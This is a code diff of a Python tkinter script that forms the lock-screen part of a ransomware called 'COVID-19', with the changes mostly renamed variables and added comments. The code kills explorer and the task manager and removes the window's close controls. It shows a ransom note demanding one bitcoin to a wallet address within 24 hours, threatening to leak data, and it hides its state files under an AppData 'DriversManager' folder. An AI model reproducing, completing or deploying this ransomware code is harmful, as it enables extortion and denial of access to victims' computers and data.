@@ -6,12 +6,17 @@ from timeit import default_timer
 import tkinter as tk
 import os, sys, timeps
 from modules.system import regedit, delproc
+
+""" THIS FILE IS PART OF THE FINAL EXECUTABLES """
+
 # GET THE ENVIRONMENT VARIABLES
-usr = os.environ["USERNAME"]
-d = os.environ["SystemDrive"]
+current_user = os.environ["USERNAME"]
+letter_drive = os.environ["SystemDrive"]
+
 # INIT VARIABLE FROM CLASS
 dk = delproc.Kill()
 dr = delproc.Remove()
+
 # TRY TO REMOVE EXPLORER IF NOT DELETED BEFORE
 try:
     dk.exp()
@@ -19,9 +24,11 @@ try:
     dr.tskmgr()
 except:
     pass
+
 # INIT WINDOW FOR GUI COUNTER
 window = Tk()
-src = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\db.txt".format(d, usr)
+src = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\db.txt".format(letter_drive, current_user)
+
 # FUNCTION TO SET A TIME
 def updateTime(generator):
     global p
@@ -40,6 +47,7 @@ def updateTime(generator):
         except:
             pass
         exit()
+        
 # INSTRUCTION MESSAGE
 def instructions():
     txt = tk.Label(font="bold", text="\nYour computer is locked by the Ransomware COVID-19\n\n \
@@ -47,6 +55,7 @@ def instructions():
     You have 24 HOURS to purchase 1 bitcoin and transfert it to this address :\n\n \
     34YVap4JyjiBTWvy6Qobmni1k3tHbdi8UEL")
     txt.pack()
+    
 # WARNING MESSAGE
 def warning():
     wrn = tk.Label(font="bold", text="Warning !!!\n \
@@ -54,17 +63,22 @@ def warning():
     And if you restart your computer, the time on the counter will be 12 HOURS OF LESS...\n\
     And if you don't pay, your sensitive data will be pubished or sold.\n")
     wrn.pack()
+    
 # BUTTON FUNCTION (work in progress...)
 def pay_to_decrypt():
     btn1 = tk.Button(window, text="Decrypt your data", font="bold", fg="red", bg="black")
     btn1.pack(side=tk.BOTTOM)
     btn2 = tk.Button(window, text="Pay the Ransom", font="bold", fg="red", bg="black")
     btn2.pack(side=tk.BOTTOM)
-# INSTRUCTION to desactived the header who contains the resize, minimize and exit window
+    
+# INSTRUCTION TO DEACTIVATE THE HEADER WHO CONTAINS THE RISIZE, MINIMIZE, AND EXIT WINDOWS
 window.overrideredirect(1)
+
+# SETTING THE WINDOW SIZE
 canvas = Canvas(window, width=200, height=100, bg="red")
 canvas.pack()
 text_clock = canvas.create_text(100, 50)
+
 # FUNCTION TO CONTROL IF DB.txt EXIST
 try:
     with open(src, "r") as db:
@@ -81,13 +95,15 @@ except:
     with open(src, "w") as db:
         updateTime(timeps.set_time(12, 0, 0))
 try:
-    a = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\image.jpg".format(d, usr)
-    # SET IMAGE INTO WINDOW
+    a = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\image.jpg".format(letter_drive, current_user)
+    
+    # ADDING IMAGE INTO WINDOW
     img = ImageTk.PhotoImage(Image.open(a))
     panel = tk.Label(window, image = img)
     panel.pack(side = "top", fill = "both", expand = "yes")
 except FileNotFoundError:
     pass
+
 # CALL EVERY FUNCTION INTO WINDOW
 instructions()
 warning()
